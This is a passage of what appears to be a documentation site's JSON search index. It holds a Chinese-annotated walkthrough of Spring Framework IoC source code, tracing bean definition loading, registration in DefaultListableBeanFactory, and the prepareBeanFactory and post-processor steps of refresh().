loadBeanDefinitions(location)\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(location)\u200b\u65b9\u6cd5","text":"<ul> <li>loadBeanDefinitions(location)\u200b\u65b9\u6cd5\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\uff1b Java<pre><code>@Override\npublic int loadBeanDefinitions(String location) throws BeanDefinitionStoreException {\n    return loadBeanDefinitions(location, null);\n}\n</code></pre></li> <li>\u200b\u89e3\u6790\u200b\u8d44\u6e90\u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\uff0c\u200b\u5f97\u5230\u200bResource[]\u200b\u8d44\u6e90\u200b\u6570\u7ec4\u200b</li> <li>\u200b\u4e0a\u9762\u200bAbstractBeanDefinitionReader\u200b\u4e2d\u200b\u7684\u200bloadBeanDefinitions(String location)\u200b\u65b9\u6cd5\u200b\u53c8\u200b\u8c03\u7528\u200b\u4e86\u200b\u540c\u7c7b\u200b\u91cc\u9762\u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(String location, @Nullable Set actualResources) \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b\uff1a Java<pre><code>public int loadBeanDefinitions(String location, @Nullable Set&lt;Resource&gt; actualResources) throws BeanDefinitionStoreException {\n        ResourceLoader resourceLoader = getResourceLoader();\n        if (resourceLoader == null) {\n            throw new BeanDefinitionStoreException(\n                    \"Cannot load bean definitions from location [\" + location + \"]: no ResourceLoader available\");\n        }\n\n        if (resourceLoader instanceof ResourcePatternResolver) {\n            // Resource pattern matching available.\n            try {\n                Resource[] resources = ((ResourcePatternResolver) resourceLoader).getResources(location);\n                //\u200b\u4e0b\u200b\u4e00\u884c\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b  \u200b\u8c03\u7528\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u91cd\u8f7d\u200b\u65b9\u6cd5\u200bloadBeanDefinitions(Resource resource)\n                int count = loadBeanDefinitions(resources);\n                if (actualResources != null) {\n                    Collections.addAll(actualResources, resources);\n                }\n                if (logger.isTraceEnabled()) {\n                    logger.trace(\"Loaded \" + count + \" bean definitions from location pattern [\" + location + \"]\");\n                }\n                return count;\n            }\n            catch (IOException ex) {\n                throw new BeanDefinitionStoreException(\n                        \"Could not resolve bean definition resource pattern [\" + location + \"]\", ex);\n            }\n        }\n        else {\n            // Can only load single resources by absolute URL.\n            Resource resource = resourceLoader.getResource(location);\n            int count = loadBeanDefinitions(resource);\n            if (actualResources != null) {\n                actualResources.add(resource);\n            }\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Loaded \" + count + \" bean definitions from location [\" + location + \"]\");\n            }\n            return count;\n        }\n    }\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#xmlbeandefinitionreaderdoloadbeandefinitionsinputsource-inputsource-resource-resource","title":"XmlBeanDefinitionReader\u200b\u7c7b\u4e2d\u200b\u7684\u200bdoLoadBeanDefinitions(InputSource inputSource, Resource resource)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u8f7d\u5165\u200b\u5b9a\u4e49\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u65b9\u6cd5\u200b</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.xml.XmlBeanDefinitionReader Java<pre><code>protected int doLoadBeanDefinitions(InputSource inputSource, Resource resource)\n        throws BeanDefinitionStoreException {\n\n    try {\n        // \u200b\u89e3\u6790\u200bXML\u200b\u6587\u6863\u200b\n        Document doc = doLoadDocument(inputSource, resource);\n        // \u200b\u4e0b\u9762\u200b\u4e00\u884c\u200b\u4ee3\u7801\u200b \u200b\u6ce8\u518c\u200bBean\n        int count = registerBeanDefinitions(doc, resource);\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"Loaded \" + count + \" bean definitions from \" + resource);\n        }\n        return count;\n    }\n    catch (BeanDefinitionStoreException ex) {\n        throw ex;\n    }\n    catch (SAXParseException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                \"Line \" + ex.getLineNumber() + \" in XML document from \" + resource + \" is invalid\", ex);\n    }\n    catch (SAXException ex) {\n        throw new XmlBeanDefinitionStoreException(resource.getDescription(),\n                \"XML document from \" + resource + \" is invalid\", ex);\n    }\n    catch (ParserConfigurationException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"Parser configuration exception parsing XML from \" + resource, ex);\n    }\n    catch (IOException ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"IOException parsing XML document from \" + resource, ex);\n    }\n    catch (Throwable ex) {\n        throw new BeanDefinitionStoreException(resource.getDescription(),\n                \"Unexpected exception parsing XML document from \" + resource, ex);\n    }\n}\n\n// \u200b\u6ce8\u518c\u200bBean\u200b\u7684\u200b\u65b9\u6cd5\u200b\npublic int registerBeanDefinitions(Document doc, Resource resource) throws BeanDefinitionStoreException {\n    BeanDefinitionDocumentReader documentReader = createBeanDefinitionDocumentReader();\n    int countBefore = getRegistry().getBeanDefinitionCount();\n    // \u200b\u6ce8\u518c\u200bbean\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    documentReader.registerBeanDefinitions(doc, createReaderContext(resource));\n    return getRegistry().getBeanDefinitionCount() - countBefore;\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#defaultbeandefinitiondocumentreaderregisterbeandefinitionsdocument-doc-xmlreadercontext-readercontext","title":"DefaultBeanDefinitionDocumentReader.registerBeanDefinitions(Document doc, XmlReaderContext readerContext)","text":"<ul> <li>\u200b\u529f\u80fd\u200b\uff1a</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.xml.DefaultBeanDefinitionDocumentReader Java<pre><code>@Override\npublic void registerBeanDefinitions(Document doc, XmlReaderContext readerContext) {\n    this.readerContext = readerContext;\n    // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    doRegisterBeanDefinitions(doc.getDocumentElement());\n}\n\n// registerBeanDefinitions\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bdoRegisterBeanDefinitions\u200b\u65b9\u6cd5\u200b\n@SuppressWarnings(\"deprecation\")  // for Environment.acceptsProfiles(String...)\nprotected void doRegisterBeanDefinitions(Element root) {\n    // Any nested &lt;beans&gt; elements will cause recursion in this method. In\n    // order to propagate and preserve &lt;beans&gt; default-* attributes correctly,\n    // keep track of the current (parent) delegate, which may be null. Create\n    // the new (child) delegate with a reference to the parent for fallback purposes,\n    // then ultimately reset this.delegate back to its original (parent) reference.\n    // this behavior emulates a stack of delegates without actually necessitating one.\n    BeanDefinitionParserDelegate parent = this.delegate;\n    this.delegate = createDelegate(getReaderContext(), root, parent);\n\n    if (this.delegate.isDefaultNamespace(root)) {\n        String profileSpec = root.getAttribute(PROFILE_ATTRIBUTE);\n        if (StringUtils.hasText(profileSpec)) {\n            String[] specifiedProfiles = StringUtils.tokenizeToStringArray(\n                    profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);\n            // We cannot use Profiles.of(...) since profile expressions are not supported\n            // in XML config. See SPR-12458 for details.\n            if (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) {\n                if (logger.isDebugEnabled()) {\n                    logger.debug(\"Skipped XML bean definition file due to specified profiles [\" + profileSpec +\n                            \"] not matching: \" + getReaderContext().getResource());\n                }\n                return;\n            }\n        }\n    }\n\n    preProcessXml(root);\n    // \u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n    parseBeanDefinitions(root, this.delegate);\n    postProcessXml(root);\n\n    this.delegate = parent;\n}\n\n// \u200b\u4e0a\u9762\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u8c03\u7528\u200b\u7684\u200bparseBeanDefinitions(root, this.delegate)\u200b\u5bf9\u5e94\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5b9e\u73b0\u200b\nprotected void parseBeanDefinitions(Element root, BeanDefinitionParserDelegate delegate) {\n    if (delegate.isDefaultNamespace(root)) {\n        NodeList nl = root.getChildNodes();\n        for (int i = 0; i &lt; nl.getLength(); i++) {\n            Node node = nl.item(i);\n            if (node instanceof Element) {\n                Element ele = (Element) node;\n                if (delegate.isDefaultNamespace(ele)) {\n                    // \u200b\u672c\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6838\u5fc3\u200b\u903b\u8f91\u200b\n                    parseDefaultElement(ele, delegate);\n                }\n                else {\n                    delegate.parseCustomElement(ele);\n                }\n            }\n        }\n    }\n    else {\n        delegate.parseCustomElement(root);\n    }\n}\n\n\n// \u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u8c03\u7528\u200b\u7684\u200bparseDefaultElement(ele, delegate);\u200b\u7684\u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\n// \u200b\u6839\u636e\u200bbean\u200b\u914d\u7f6e\u200b\u7684\u200b\u4e0d\u540c\u200b\uff0c\u200b\u8fdb\u5165\u200b\u4e0d\u540c\u200b\u5206\u652f\u200b\nprivate void parseDefaultElement(Element ele, BeanDefinitionParserDelegate delegate) {\n    if (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) {\n        importBeanDefinitionResource(ele);\n    }\n    else if (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) {\n        processAliasRegistration(ele);\n    }\n    else if (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) {\n        // \u200b\u672c\u6587\u200b\u793a\u4f8b\u200b\u4f1a\u200b\u8fdb\u5165\u200b\u8be5\u200b\u65b9\u6cd5\u200b\n        processBeanDefinition(ele, delegate);\n    }\n    else if (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) {\n        // recurse\n        doRegisterBeanDefinitions(ele);\n    }\n}\n\n// \u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u6700\u540e\u200b\u8fdb\u5165\u200bprocessBeanDefinition(ele, delegate)\u200b\u540e\u200b\u7684\u200b\u5904\u7406\u8fc7\u7a0b\u200b\uff1a\nprotected void processBeanDefinition(Element ele, BeanDefinitionParserDelegate delegate) {\n    BeanDefinitionHolder bdHolder = delegate.parseBeanDefinitionElement(ele);\n    if (bdHolder != null) {\n        bdHolder = delegate.decorateBeanDefinitionIfRequired(ele, bdHolder);\n        try {\n            // Register the final decorated instance.\n            // \u200b\u6ce8\u518c\u200bBean\u200b\u7684\u200b\u5173\u952e\u200b\u4ee3\u7801\u200b\n            BeanDefinitionReaderUtils.registerBeanDefinition(bdHolder, getReaderContext().getRegistry());\n        }\n        catch (BeanDefinitionStoreException ex) {\n            getReaderContext().error(\"Failed to register bean definition with name '\" +\n                    bdHolder.getBeanName() + \"'\", ele, ex);\n        }\n        // Send registration event.\n        getReaderContext().fireComponentRegistered(new BeanComponentDefinition(bdHolder));\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#beandefinitionreaderutilsregisterbeandefinitionbdholder-getreadercontextgetregistry","title":"BeanDefinitionReaderUtils\u200b\u7684\u200bregisterBeanDefinition(bdHolder, getReaderContext().getRegistry())\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4e3b\u8981\u200b\u4f5c\u7528\u200b\uff1a</li> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.BeanDefinitionReaderUtils Java<pre><code>public static void registerBeanDefinition(\n        BeanDefinitionHolder definitionHolder, BeanDefinitionRegistry registry)\n        throws BeanDefinitionStoreException {\n\n    // Register bean definition under primary name.\n    String beanName = definitionHolder.getBeanName();\n    // \u200b\u5c06\u200bBean\u200b\u7684\u200b\u540d\u5b57\u200b\u548c\u200bBeanDefinition\u200b\u5bf9\u8c61\u200b\u8fdb\u884c\u200b\u6ce8\u518c\u200b\n    // registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());\u200b\u65b9\u6cd5\u200b\u5b9a\u4e49\u200b\u5728\u200bBeanDefinitionRegistry\u200b\u63a5\u53e3\u200b\u4e2d\u200b\uff1a\n    // \u200b\u5177\u4f53\u200b\u5b9e\u73b0\u200b\u5728\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\n    registry.registerBeanDefinition(beanName, definitionHolder.getBeanDefinition());\n\n    // Register aliases for bean name, if any.\n    String[] aliases = definitionHolder.getAliases();\n    if (aliases != null) {\n        for (String alias : aliases) {\n            registry.registerAlias(beanName, alias);\n        }\n    }\n}\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#defaultlistablebeanfactoryregisterbeandefinitionstring-beanname-beandefinition-beandefinition","title":"DefaultListableBeanFactory\u200b\u4e2d\u200bregisterBeanDefinition(String beanName, BeanDefinition beanDefinition)","text":"<ul> <li>\u200b\u4f5c\u7528\u200b\uff1a</li> <li>DefaultListableBeanFactory\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionMap\u200b\u662f\u200b\u4e00\u4e2a\u200bConcurrentHashMap\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200bbean\u200b\u7684\u200b\u5b9a\u4e49\u200b\u4fe1\u606f\u200b <li>DefaultListableBeanFactory\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionNames\u200b\u662f\u200b\u4e00\u4e2a\u200bArrayList\u200b\u7c7b\u578b\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200bBean\u200b\u7684\u200b\u540d\u79f0\u200b <li> </li> <li>\u200b\u5230\u200b\u6b64\u200b\u4e0a\u9762\u200b\u7684\u200b loadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5\u200b\u57fa\u672c\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b</li> <li>\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200bloadBeanDefinitions(DefaultListableBeanFactory beanFactory)\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u6267\u884c\u200b\u5230\u200bloadBeanDefinitions(XmlBeanDefinitionReader reader)\u200b\u65b9\u6cd5\u200b\u540e\u200b\u7ed3\u675f\u200b</li> <li>\u200b\u5728\u200b\u4e0a\u8ff0\u200b\u521b\u5efa\u200bBeanFactory\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0cBeanDefination\u200b\u6ce8\u518c\u200b\u5230\u200bBeanFactory\uff08DefaultListableBeanFactory\uff09\u200b\u4e2d\u200b\u7684\u200b\u7c7b\u578b\u200b\u4e3a\u200bConcurrentHashMap\uff0c\u200b\u5b57\u6bb5\u540d\u200bbeanDefinitionMap\u200b\u7684\u200b\u4e3a\u200b\u5bf9\u8c61\u200b\u4e2d\u200b <li>\u200b\u5411\u200bbeanDefinitionMap\u200b\u4e2d\u200b\u6ce8\u518c\u200b\u65f6\u200bbeanName\u200b\u4e3a\u200bkey,beanDefination\u200b\u4e3a\u200bvalue\uff1b</li> <li>DefaultListableBeanFactory\u200b\u5bf9\u8c61\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200bbeanDefinitionNames\u200b\u662f\u200b\u4e00\u4e2a\u200bArrayList\u200b\u7c7b\u578b\u200b\u6570\u636e\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200b\u6240\u6709\u200b\u5df2\u7ecf\u200b\u6ce8\u518c\u200b\u7684\u200bBean\u200b\u7684\u200b\u540d\u79f0\u200b <li>refreshBeanFactory()\u200b\u65b9\u6cd5\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u8fdb\u5165\u200b\u5176\u4e0b\u200b\u4e00\u884c\u200b\u7684\u200bgetBeanFactory()\u200b\u65b9\u6cd5\u200b</li>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#orgspringframeworkbeansfactorysupportdefaultlistablebeanfactory","title":"\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b\uff1aorg.springframework.beans.factory.support.DefaultListableBeanFactory","text":"Java<pre><code>@Override\npublic void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)\n        throws BeanDefinitionStoreException {\n\n    Assert.hasText(beanName, \"Bean name must not be empty\");\n    Assert.notNull(beanDefinition, \"BeanDefinition must not be null\");\n\n    if (beanDefinition instanceof AbstractBeanDefinition) {\n        try {\n            ((AbstractBeanDefinition) beanDefinition).validate();\n        }\n        catch (BeanDefinitionValidationException ex) {\n            throw new BeanDefinitionStoreException(beanDefinition.getResourceDescription(), beanName,\n                    \"Validation of bean definition failed\", ex);\n        }\n    }\n\n    BeanDefinition existingDefinition = this.beanDefinitionMap.get(beanName);\n    // \u200b\u67e5\u627e\u200b\u662f\u5426\u200b\u5b58\u5728\u200b\u540c\u540d\u200b\u7684\u200bbean\n    if (existingDefinition != null) {\n        // \u200b\u6709\u200b\u540c\u540d\u200b\u7684\u200bbean\u200b\u5b58\u5728\u200b\u65f6\u200b\n        if (!isAllowBeanDefinitionOverriding()) {\n            throw new BeanDefinitionOverrideException(beanName, beanDefinition, existingDefinition);\n        }\n        else if (existingDefinition.getRole() &lt; beanDefinition.getRole()) {\n            // e.g. was ROLE_APPLICATION, now overriding with ROLE_SUPPORT or ROLE_INFRASTRUCTURE\n            if (logger.isInfoEnabled()) {\n                logger.info(\"Overriding user-defined bean definition for bean '\" + beanName +\n                        \"' with a framework-generated bean definition: replacing [\" +\n                        existingDefinition + \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        else if (!beanDefinition.equals(existingDefinition)) {\n            if (logger.isDebugEnabled()) {\n                logger.debug(\"Overriding bean definition for bean '\" + beanName +\n                        \"' with a different definition: replacing [\" + existingDefinition +\n                        \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        else {\n            if (logger.isTraceEnabled()) {\n                logger.trace(\"Overriding bean definition for bean '\" + beanName +\n                        \"' with an equivalent definition: replacing [\" + existingDefinition +\n                        \"] with [\" + beanDefinition + \"]\");\n            }\n        }\n        this.beanDefinitionMap.put(beanName, beanDefinition);\n    }\n    else {\n        // \u200b\u6ca1\u6709\u200b\u540c\u540d\u200b\u7684\u200bbean\u200b\u5b58\u5728\u200b\u65f6\u200b\n        if (hasBeanCreationStarted()) {\n            // Cannot modify startup-time collection elements anymore (for stable iteration)\n            synchronized (this.beanDefinitionMap) {\n                // beanDefinitionMap\u200b\u5b58\u50a8\u200bbeanName:BeanDefinition\u200b\u4e00\u4e00\u5bf9\u5e94\u200b\u7684\u200bK:V\u200b\u4fe1\u606f\u200b\n                // beanName\u200b\u4f5c\u4e3a\u200bkey\uff0c beanDefinition\u200b\u4f5c\u4e3a\u200bvalue\u200b\u5b58\u5165\u200bDefaultListableBeanFactory\u200b\u5bf9\u8c61\u200b\u7684\u200bbeanDefinitionMap\u200b\u5b57\u6bb5\u200b\u4e2d\u200b\n                // \u200b\u5b8c\u6210\u200bBean\u200b\u7684\u200b\u6ce8\u518c\u200b\uff0c\u200b\u5c06\u200bBean\u200b\u6ce8\u518c\u200b\u5230\u200bBeanFactory\u200b\u4e2d\u200b\n                this.beanDefinitionMap.put(beanName, beanDefinition);\n                List&lt;String&gt; updatedDefinitions = new ArrayList&lt;&gt;(this.beanDefinitionNames.size() + 1);\n                updatedDefinitions.addAll(this.beanDefinitionNames);\n                updatedDefinitions.add(beanName);\n                // \u200b\u5c06\u200b\u6240\u6709\u200b\u7684\u200bbeanName\u200b\u4fdd\u5b58\u200b\u5230\u200bbeanDefinitionNames\u200b\u5b57\u6bb5\u200b\u4e2d\u200b\uff0c\u200b\u6570\u636e\u7c7b\u578b\u200b\u4e3a\u200b\n                this.beanDefinitionNames = updatedDefinitions;\n                removeManualSingletonName(beanName);\n            }\n        }\n        else {\n            // Still in startup registration phase\n            this.beanDefinitionMap.put(beanName, beanDefinition);\n            this.beanDefinitionNames.add(beanName);\n            removeManualSingletonName(beanName);\n        }\n        this.frozenBeanDefinitionNames = null;\n    }\n\n    if (existingDefinition != null || containsSingleton(beanName)) {\n        resetBeanDefinition(beanName);\n    }\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#getbeanfactory","title":"getBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0","text":"<ul> <li>AbstractRefreshableApplicationContext\u200b\u4e2d\u200bgetBeanFactory()\u200b\u65b9\u6cd5\u200b\u7684\u200b\u4e00\u79cd\u200b\u5b9e\u73b0\u200b</li> <li>\u200b\u83b7\u53d6\u200bBeanFactory Java<pre><code>@Override\npublic final ConfigurableListableBeanFactory getBeanFactory() {\n    synchronized (this.beanFactoryMonitor) {\n        if (this.beanFactory == null) {\n           throw new IllegalStateException(\"BeanFactory not initialized or already closed - call 'refresh' before accessing beans via the ApplicationContext\");\n        }\n        return this.beanFactory;\n    }\n}\n</code></pre></li> <li>getBeanFactory()\u200b\u65b9\u6cd5\u200b\u6267\u884c\u200b\u5b8c\u200b\uff0c\u200b\u6807\u5fd7\u200b\u4e0a\u200b\u4e00\u7ea7\u200b\u7684\u200b\u65b9\u6cd5\u200bobtainFreshBeanFactory()\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c06\u200b\u8fdb\u5165\u200bAbstractApplicationContext\u200b\u62bd\u8c61\u7c7b\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u7684\u200brefresh()\u200b\u6a21\u677f\u200b\u65b9\u6cd5\u200b\u4e2d\u200b\u7684\u200b\u7b2c\u4e09\u6b65\u200b\u5b9a\u4e49\u200b\u7684\u200bprepareBeanFactory(beanFactory)\u200b\u65b9\u6cd5\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#6-preparebeanfactorybeanfactory","title":"6 prepareBeanFactory(beanFactory)\u200b\u65b9\u6cd5","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b: org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void prepareBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        // Tell the internal bean factory to use the context's class loader etc.\n        beanFactory.setBeanClassLoader(getClassLoader());\n        beanFactory.setBeanExpressionResolver(new StandardBeanExpressionResolver(beanFactory.getBeanClassLoader()));\n        beanFactory.addPropertyEditorRegistrar(new ResourceEditorRegistrar(this, getEnvironment()));\n\n        // Configure the bean factory with context callbacks.\n        beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n        beanFactory.ignoreDependencyInterface(EnvironmentAware.class);\n        beanFactory.ignoreDependencyInterface(EmbeddedValueResolverAware.class);\n        beanFactory.ignoreDependencyInterface(ResourceLoaderAware.class);\n        beanFactory.ignoreDependencyInterface(ApplicationEventPublisherAware.class);\n        beanFactory.ignoreDependencyInterface(MessageSourceAware.class);\n        beanFactory.ignoreDependencyInterface(ApplicationContextAware.class);\n\n        // BeanFactory interface not registered as resolvable type in a plain factory.\n        // MessageSource registered (and found for autowiring) as a bean.\n        beanFactory.registerResolvableDependency(BeanFactory.class, beanFactory);\n        beanFactory.registerResolvableDependency(ResourceLoader.class, this);\n        beanFactory.registerResolvableDependency(ApplicationEventPublisher.class, this);\n        beanFactory.registerResolvableDependency(ApplicationContext.class, this);\n\n        // Register early post-processor for detecting inner beans as ApplicationListeners.\n        beanFactory.addBeanPostProcessor(new ApplicationListenerDetector(this));\n\n        // Detect a LoadTimeWeaver and prepare for weaving, if found.\n        if (beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n            beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n            // Set a temporary ClassLoader for type matching.\n            beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n        }\n\n        // Register default environment beans.\n        if (!beanFactory.containsLocalBean(ENVIRONMENT_BEAN_NAME)) {\n            beanFactory.registerSingleton(ENVIRONMENT_BEAN_NAME, getEnvironment());\n        }\n        if (!beanFactory.containsLocalBean(SYSTEM_PROPERTIES_BEAN_NAME)) {\n            beanFactory.registerSingleton(SYSTEM_PROPERTIES_BEAN_NAME, getEnvironment().getSystemProperties());\n        }\n        if (!beanFactory.containsLocalBean(SYSTEM_ENVIRONMENT_BEAN_NAME)) {\n            beanFactory.registerSingleton(SYSTEM_ENVIRONMENT_BEAN_NAME, getEnvironment().getSystemEnvironment());\n        }\n    }\n</code></pre></li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#7-postprocessbeanfactoryconfigurablelistablebeanfactory-beanfactory","title":"7 postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory)","text":"<ul> <li>\u200b\u4ee3\u7801\u200b\u4f4d\u7f6e\u200b:org.springframework.context.support.AbstractApplicationContext.java Java<pre><code>protected void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n    // \u200b\u8be5\u200b\u65b9\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7a7a\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u4f9d\u636e\u200b\u5177\u4f53\u200b\u7684\u200b\u60c5\u51b5\u200b\u5728\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u7ee7\u627f\u200b\u6216\u200b\u8fdb\u884c\u200b\u91cd\u5199\u200b\n    // \u200b\u89c2\u5bdf\u200bAbstractApplicationContext\u200b\u5230\u200bFileSystemXmlApplicationContext(location)\u200b\u7684\u200b\u7ee7\u627f\u200b\u8def\u5f84\u200b\uff0c\u200b\u5176\u5b50\u200b\u7c7b\u4e2d\u200b\u5e76\u672a\u200b\u5b9e\u73b0\u200b\u5177\u4f53\u200b\u7684\u200b\u903b\u8f91\u200b;\n}\n</code></pre></li> <li>postProcessBeanFactory(beanFactory)\u200b\u6267\u884c\u200b\u5b8c\u540e\u200b\u8fdb\u5165\u200b invokeBeanFactoryPostProcessors(beanFactory)\u200b\u65b9\u6cd5\u200b</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/6/#8-invokebeanfactorypostprocessorsbeanfactory","title":"8. invokeBeanFactoryPostProcessors(beanFactory)\u200b\u65b9\u6cd5","text":"Java<pre><code>protected void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) {\n    PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());\n\n    // Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime\n    // (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)\n    if (beanFactory.getTempClassLoader() == null &amp;&amp; beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) {\n        beanFactory.addBeanPostProcessor(new LoadTimeWeaverAwareProcessor(beanFactory));\n        beanFactory.setTempClassLoader(new ContextTypeMatchClassLoader(beanFactory.getBeanClassLoader()));\n    }\n}\n\npublic List&lt;BeanFactoryPostProcessor&gt; getBeanFactoryPostProcessors() {\n    return this.beanFactoryPostProcessors;\n}\n</code></pre> <ul> <li>PostProcessorRegistrationDelegate\u200b\u7684\u200binvokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory, List beanFactoryPostProcessors)\u200b\u9759\u6001\u65b9\u6cd5\u200b Java<pre><code>public static void invokeBeanFactoryPostProcessors(\n        ConfigurableListableBeanFactory beanFactory, List&lt;BeanFactoryPostProcessor&gt; beanFactoryPostProcessors) {\n\n    // Invoke BeanDefinitionRegistryPostProcessors first, if any.\n    Set&lt;String&gt; processedBeans = new HashSet&lt;&gt;();\n\n    if (beanFactory instanceof BeanDefinitionRegistry) {\n        BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;\n        List&lt;BeanFactoryPostProcessor&gt; regularPostProcessors = new ArrayList&lt;&gt;();\n        List&lt;BeanDefinitionRegistryPostProcessor&gt; registryProcessors = new ArrayList&lt;&gt;();\n\n        for (BeanFactoryPostProcessor postProcessor : beanFactoryPostProcessors) {\n            if (postProcessor instanceof BeanDefinitionRegistryPostProcessor) {\n                BeanDefinitionRegistryPostProcessor registryProcessor =\n                        (BeanDefinitionRegistryPostProcessor) postProcessor;\n                registryProcessor.postProcessBeanDefinitionRegistry(registry);\n                registryProcessors.add(registryProcessor);\n            }\n            else {\n                regularPostProcessors.add(postProcessor);\n            }\n        }\n\n        // Do not initialize FactoryBeans here: We need to leave all regular beans\n        // uninitialized to let the bean factory post-processors apply to them!\n        // Separate between BeanDefinitionRegistryPostProcessors that implement\n        // PriorityOrdered, Ordered, and the rest.\n        List&lt;BeanDefinitionRegistryPostProcessor&gt; currentRegistryProcessors = new ArrayList&lt;&gt;();\n\n        // First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.\n        String[] postProcessorNames =\n                beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);\n        for (String ppName : postProcessorNames) {\n            if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) {\n                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));\n                processedBeans.add(ppName);\n            